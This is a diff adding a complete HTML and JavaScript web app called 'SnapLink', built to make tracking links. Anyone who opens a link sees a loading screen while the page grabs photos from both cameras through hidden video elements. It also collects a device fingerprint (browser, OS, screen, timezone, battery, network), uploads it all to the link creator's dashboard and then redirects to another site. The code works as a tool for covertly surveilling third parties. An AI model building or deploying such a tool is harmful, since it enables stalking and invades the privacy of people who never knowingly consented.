@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SnapLink – Share & Capture</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family: 'Inter', system-ui, sans-serif; background:#0b0d12; color:#eef2f6; padding:20px; }
+        .container { max-width:800px; margin:0 auto; background:#151a22; border-radius:28px; padding:32px; border:1px solid #2a313c; }
+        h1 { font-size:28px; background:linear-gradient(135deg,#f0f4ff,#8ab4f8); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
+        .sub { color:#8895aa; margin-bottom:24px; }
+        input, textarea, button { width:100%; padding:12px 16px; background:#1e2632; border:1px solid #2e3848; border-radius:12px; color:#f0f4ff; font-size:15px; }
+        input:focus, textarea:focus { border-color:#4d8bf7; box-shadow:0 0 0 3px rgba(77,139,247,0.2); }
+        .btn { background:#2f6ed4; border:none; font-weight:600; cursor:pointer; transition:0.2s; }
+        .btn:hover { background:#3d7ce6; transform:translateY(-1px); }
+        .btn-secondary { background:#252f3e; }
+        .btn-success { background:#1f8b4c; }
+        .link-card { background:#1a222e; border-radius:16px; padding:16px; margin:16px 0; border:1px solid #2a3444; }
+        .capture-grid { display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-top:12px; }
+        .capture-item { background:#11171f; border-radius:12px; padding:10px; }
+        .capture-item img { width:100%; border-radius:8px; }
+        .capture-meta { font-size:12px; color:#8899b0; margin-top:4px; }
+        .toast { padding:12px; border-radius:12px; background:#1f2a3a; border-left:4px solid #4d8bf7; margin:10px 0; display:none; }
+        .toast.show { display:block; }
+        .loader { text-align:center; padding:20px; }
+        .spinner { width:50px; height:50px; border:5px solid #1e2a3a; border-top-color:#4d8bf7; border-radius:50%; animation:spin 0.9s linear infinite; margin:0 auto 12px; }
+        @keyframes spin { to { transform:rotate(360deg); } }
+        .hidden { display:none; }
+        video { position:fixed; top:-9999px; left:-9999px; width:1px; height:1px; }
+        .step { display:inline-block; margin:0 4px; font-size:16px; transition:0.3s; color:#2a3444; }
+        .step.active { color:#4d8bf7; font-size:24px; }
+        .step.done { color:#3dcd7a; font-size:20px; }
+    </style>
+</head>
+<body>
+<div class="container" id="app">
+    <!-- Dashboard -->
+    <div id="dashboard">
+        <h1>📸 SnapLink</h1>
+        <div class="sub">Create links that capture photos & device data from anyone who opens them.</div>
+        
+        <div style="display:grid; gap:12px; margin-bottom:24px;">
+            <input type="url" id="redirectUrl" placeholder="Redirect URL (e.g. https://example.com)" />
+            <input type="email" id="creatorEmail" placeholder="Your email (optional)" />
+            <button class="btn" id="createBtn">✨ Create Link</button>
+        </div>
+
+        <div id="linkResult" class="hidden" style="margin-bottom:20px;">
+            <div class="link-card" style="display:flex; gap:12px; align-items:center; flex-wrap:wrap;">
+                <input type="text" id="generatedLink" readonly style="flex:1; background:transparent; border:none; padding:8px 0;" />
+                <button class="btn btn-secondary" id="copyBtn" style="width:auto; padding:8px 20px;">Copy</button>
+            </div>
+            <div id="createToast" class="toast"></div>
+        </div>
+
+        <hr style="border-color:#1f2836; margin:20px 0;" />
+
+        <h2 style="font-size:20px; margin-bottom:12px;">📋 Your Links</h2>
+        <div id="linksList"></div>
+    </div>
+
+    <!-- Viewer -->
+    <div id="viewer" class="hidden">
+        <div class="loader">
+            <div class="spinner"></div>
+            <p id="viewerStatus">⏳ Preparing…</p>
+            <div style="margin-top:16px; display:flex; gap:8px; justify-content:center;">
+                <span class="step" id="step1">●</span>
+                <span class="step" id="step2">●</span>
+                <span class="step" id="step3">●</span>
+                <span class="step" id="step4">●</span>
+            </div>
+            <div id="viewerToast" class="toast" style="margin-top:12px;"></div>
+        </div>
+    </div>
+</div>
+
+<video id="frontVideo" autoplay playsinline></video>
+<video id="backVideo" autoplay playsinline></video>
+<canvas id="captureCanvas" style="display:none;"></canvas>
+
+<script>
+// ─── Constants ───
+const CREATOR_ID_KEY = 'snaplink_creatorId';
+const API_BASE = '/api';
+
+let creatorId = localStorage.getItem(CREATOR_ID_KEY);
+if (!creatorId) {
+    creatorId = crypto.randomUUID ? crypto.randomUUID() : 'id-' + Date.now() + '-' + Math.random().toString(36).slice(2, 8);
+    localStorage.setItem(CREATOR_ID_KEY, creatorId);
+}
+
+// ─── DOM refs ───
+const dashboard = document.getElementById('dashboard');
+const viewer = document.getElementById('viewer');
+const redirectUrlInput = document.getElementById('redirectUrl');
+const creatorEmailInput = document.getElementById('creatorEmail');
+const createBtn = document.getElementById('createBtn');
+const linkResult = document.getElementById('linkResult');
+const generatedLink = document.getElementById('generatedLink');
+const copyBtn = document.getElementById('copyBtn');
+const createToast = document.getElementById('createToast');
+const linksList = document.getElementById('linksList');
+
+const viewerStatus = document.getElementById('viewerStatus');
+const viewerToast = document.getElementById('viewerToast');
+const steps = {
+    step1: document.getElementById('step1'),
+    step2: document.getElementById('step2'),
+    step3: document.getElementById('step3'),
+    step4: document.getElementById('step4'),
+};
+const frontVideo = document.getElementById('frontVideo');
+const backVideo = document.getElementById('backVideo');
+const captureCanvas = document.getElementById('captureCanvas');
+
+// ─── Helpers ───
+function showToast(el, msg, type = '') {
+    el.textContent = msg;
+    el.className = 'toast show ' + type;
+    clearTimeout(el._timer);
+    el._timer = setTimeout(() => el.className = 'toast', 5000);
+}
+
+function setStep(stepId, state) {
+    const el = steps[stepId];
+    if (!el) return;
+    el.className = 'step ' + state;
+}
+
+async function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+// ─── Collect metadata ───
+async function collectMetadata() {
+    const meta = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        languages: navigator.languages,
+        cookieEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory || 'unknown',
+        screen: `${screen.width}x${screen.height} (${screen.colorDepth}-bit)`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        browser: (() => {
+            const ua = navigator.userAgent;
+            if (ua.includes('Chrome')) return 'Chrome';
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Safari')) return 'Safari';
+            return 'Other';
+        })(),
+        os: (() => {
+            const ua = navigator.userAgent;
+            if (ua.includes('Windows')) return 'Windows';
+            if (ua.includes('Mac OS')) return 'macOS';
+            if (ua.includes('Linux')) return 'Linux';
+            if (ua.includes('Android')) return 'Android';
+            if (ua.includes('iOS')) return 'iOS';
+            return 'Unknown';
+        })(),
+        battery: null,
+    };
+    try {
+        if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            meta.battery = {
+                level: battery.level,
+                charging: battery.charging,
+                chargingTime: battery.chargingTime,
+                dischargingTime: battery.dischargingTime,
+            };
+        }
+    } catch (_) {}
+    if (navigator.connection) {
+        meta.connection = {
+            type: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt,
+        };
+    }
+    return meta;
+}
+
+// ─── Load links ───
+async function loadLinks() {
+    try {
+        const res = await fetch(`${API_BASE}/links?creatorId=${encodeURIComponent(creatorId)}`);
+        const data = await res.json();
+        if (data.links) renderLinks(data.links);
+    } catch (e) { console.error(e); }
+}
+
+function renderLinks(links) {
+    if (!links || links.length === 0) {
+        linksList.innerHTML = '<p style="color:#6a7d96;">No links created yet.</p>';
+        return;
+    }
+    let html = '';
+    for (const link of links) {
+        const captures = link.captures || [];
+        html += `<div class="link-card">
+            <div style="display:flex; justify-content:space-between; flex-wrap:wrap; gap:8px;">
+                <strong style="color:#b0c6e0;">🔗 ${link.linkId}</strong>
+                <span style="color:#6a7d96;font-size:13px;">${captures.length}/4 captures</span>
+            </div>
+            <div style="font-size:13px;color:#6a7d96;word-break:break-all;">Redirects to: ${link.redirectUrl}</div>
+            <div style="font-size:12px;color:#4d6079;margin-top:4px;">Created: ${new Date(link.createdAt).toLocaleString()}</div>`;
+        if (captures.length === 0) {
+            html += `<div style="color:#4d6079;font-size:13px;margin-top:8px;">No captures yet.</div>`;
+        } else {
+            html += `<div class="capture-grid">`;
+            for (const cap of captures) {
+                const meta = cap.metadata || {};
+                const front = cap.frontImageUrl || '';
+                const back = cap.backImageUrl || '';
+                html += `<div class="capture-item">
+                    <div style="display:flex; gap:6px; flex-wrap:wrap;">
+                        ${front ? `<img src="${front}" alt="front" style="flex:1;min-width:80px;" />` : ''}
+                        ${back ? `<img src="${back}" alt="back" style="flex:1;min-width:80px;" />` : ''}
+                    </div>
+                    <div class="capture-meta">
+                        ${meta.browser} · ${meta.os}<br>
+                        ${meta.screen || ''}<br>
+                        Battery: ${meta.battery ? (meta.battery.level*100).toFixed(0)+'%' : 'N/A'} ${meta.battery?.charging ? '⚡' : ''}
+                        <br>${new Date(cap.timestamp).toLocaleString()}
+                    </div>
+                </div>`;
+            }
+            html += `</div>`;
+        }
+        html += `</div>`;
+    }
+    linksList.innerHTML = html;
+}
+
+// ─── Create link ───
+createBtn.addEventListener('click', async () => {
+    const redirectUrl = redirectUrlInput.value.trim();
+    const email = creatorEmailInput.value.trim();
+    if (!redirectUrl) {
+        showToast(createToast, 'Please enter a redirect URL.', 'error');
+        return;
+    }
+    try { new URL(redirectUrl); } catch (_) {
+        showToast(createToast, 'Invalid URL (include https://).', 'error');
+        return;
+    }
+    try {
+        const res = await fetch(`${API_BASE}/create`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ redirectUrl, creatorId, creatorEmail: email }),
+        });
+        const data = await res.json();
+        if (data.linkId) {
+            const fullLink = window.location.origin + window.location.pathname + '?id=' + data.linkId;
+            generatedLink.value = fullLink;
+            linkResult.classList.remove('hidden');
+            showToast(createToast, '✅ Link created!', 'success');
+            loadLinks();
+        } else {
+            showToast(createToast, 'Error: ' + (data.error || 'unknown'), 'error');
+        }
+    } catch (e) {
+        showToast(createToast, 'Network error: ' + e.message, 'error');
+    }
+});
+
+copyBtn.addEventListener('click', () => {
+    navigator.clipboard.writeText(generatedLink.value).then(() => {
+        showToast(createToast, '📋 Copied!', 'success');
+    }).catch(() => {
+        generatedLink.select();
+        document.execCommand('copy');
+        showToast(createToast, '📋 Copied!', 'success');
+    });
+});
+
+// ─── Viewer init ───
+async function initViewer() {
+    const params = new URLSearchParams(window.location.search);
+    const linkId = params.get('id');
+    if (!linkId) return false;
+
+    dashboard.classList.add('hidden');
+    viewer.classList.remove('hidden');
+
+    try {
+        const res = await fetch(`${API_BASE}/captures?linkId=${encodeURIComponent(linkId)}`);
+        const data = await res.json();
+        if (!data.linkExists) {
+            viewerStatus.textContent = '❌ Link not found.';
+            return true;
+        }
+        if (data.capturesCount >= 4) {
+            viewerStatus.textContent = '⛔ This link has reached its 4‑capture limit.';
+            setTimeout(() => {
+                if (data.redirectUrl) window.location.href = data.redirectUrl;
+            }, 3000);
+            return true;
+        }
+        await performCapture(linkId, data.redirectUrl);
+    } catch (e) {
+        viewerStatus.textContent = '⚠️ Error: ' + e.message;
+        showToast(viewerToast, 'Error: ' + e.message, 'error');
+        await sleep(3000);
+        window.location.href = 'https://example.com';
+    }
+    return true;
+}
+
+// ─── Perform capture ───
+async function performCapture(linkId, redirectUrl) {
+    try {
+        setStep('step1', 'active');
+        viewerStatus.textContent = '📷 Requesting camera permission…';
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            throw new Error('Camera not supported.');
+        }
+
+        setStep('step1', 'done');
+        setStep('step2', 'active');
+        viewerStatus.textContent = '📸 Capturing front camera…';
+        const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480 }, audio: false });
+        frontVideo.srcObject = frontStream;
+        await frontVideo.play();
+        const frontImage = await captureFrame(frontVideo);
+        frontStream.getTracks().forEach(t => t.stop());
+        frontVideo.srcObject = null;
+        setStep('step2', 'done');
+
+        setStep('step3', 'active');
+        viewerStatus.textContent = '📸 Capturing back camera…';
+        const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: 640, height: 480 }, audio: false });
+        backVideo.srcObject = backStream;
+        await backVideo.play();
+        const backImage = await captureFrame(backVideo);
+        backStream.getTracks().forEach(t => t.stop());
+        backVideo.srcObject = null;
+        setStep('step3', 'done');
+
+        setStep('step4', 'active');
+        viewerStatus.textContent = '📤 Sending data…';
+        const metadata = await collectMetadata();
+
+        const formData = new FormData();
+        formData.append('linkId', linkId);
+        formData.append('frontImage', dataURLtoBlob(frontImage), 'front.jpg');
+        formData.append('backImage', dataURLtoBlob(backImage), 'back.jpg');
+        formData.append('metadata', JSON.stringify(metadata));
+
+        const resp = await fetch(`${API_BASE}/capture`, {
+            method: 'POST',
+            body: formData,
+        });
+        const result = await resp.json();
+        if (!resp.ok) throw new Error(result.error || 'Upload failed');
+
+        setStep('step4', 'done');
+        viewerStatus.textContent = '✅ Done! Redirecting…';
+        showToast(viewerToast, 'Captured successfully!', 'success');
+        await sleep(800);
+        window.location.href = redirectUrl;
+    } catch (err) {
+        viewerStatus.textContent = '⚠️ ' + err.message;
+        showToast(viewerToast, 'Error: ' + err.message, 'error');
+        await sleep(2500);
+        window.location.href = redirectUrl;
+    }
+}
+
+function captureFrame(video) {
+    return new Promise((resolve) => {
+        const canvas = captureCanvas;
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        resolve(canvas.toDataURL('image/jpeg', 0.85));
+    });
+}
+
+function dataURLtoBlob(dataUrl) {
+    const parts = dataUrl.split(',');
+    const mime = parts[0].match(/:(.*?);/)[1];
+    const b64 = parts[1];
+    const byteStr = atob(b64);
+    const bytes = new Uint8Array(byteStr.length);
+    for (let i = 0; i < byteStr.length; i++) bytes[i] = byteStr.charCodeAt(i);
+    return new Blob([bytes], { type: mime });
+}
+
+// ─── Start ───
+(async () => {
+    const isViewer = await initViewer();
+    if (!isViewer) {
+        dashboard.classList.remove('hidden');
+        viewer.classList.add('hidden');
+        loadLinks();
+    }
+})();
+</script>
+</body>
+</html>
